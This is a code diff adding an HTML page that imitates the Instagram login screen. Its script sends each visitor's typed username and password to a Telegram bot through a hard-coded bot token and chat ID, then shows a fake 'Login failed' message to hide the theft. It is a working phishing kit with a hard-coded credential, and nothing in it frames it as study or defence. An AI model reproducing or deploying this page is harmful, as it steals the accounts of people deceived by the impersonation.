@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    /* استایل‌ها مثل قبل */
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 350px;
+    }
+    .form-box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 30px;
+      text-align: center;
+    }
+    .form-box img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+    .form-box input {
+      width: 100%;
+      padding: 9px;
+      margin: 6px 0;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+    .form-box button {
+      width: 100%;
+      padding: 8px 0;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+    .divider {
+      margin: 20px 0;
+      font-size: 13px;
+      color: #8e8e8e;
+    }
+    .bottom-box {
+      margin-top: 10px;
+      padding: 20px 0;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+    .bottom-box a,
+    .form-box a {
+      color: #00376b;
+      font-size: 13px;
+      text-decoration: none;
+    }
+    .footer-text {
+      font-size: 13px;
+      margin-top: 15px;
+      color: #8e8e8e;
+    }
+    @media screen and (max-width: 400px) {
+      .form-box, .bottom-box {
+        border: none;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="form-box">
+      <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Instagram Logo">
+      <form onsubmit="sendToTelegram(); return false;">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="divider">
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="bottom-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="footer-text">
+      Meta © 2025
+    </div>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const token = "8477301178:AAHt8dO_enOe3WX1s5l4qTEmyygTGmKuOaM";
+      const chat_id = "6161323528";
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `📥 Instagram Login\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        .then(res => res.json())
+        .then(data => {
+          alert("❌ Login failed");  // پیام تغییر کرده
+        })
+        .catch(err => {
+          console.error("❌ Error:", err);
+          alert("⚠️ ،Turn on.");
+        });
+    }
+  </script>
+</body>
+</html>
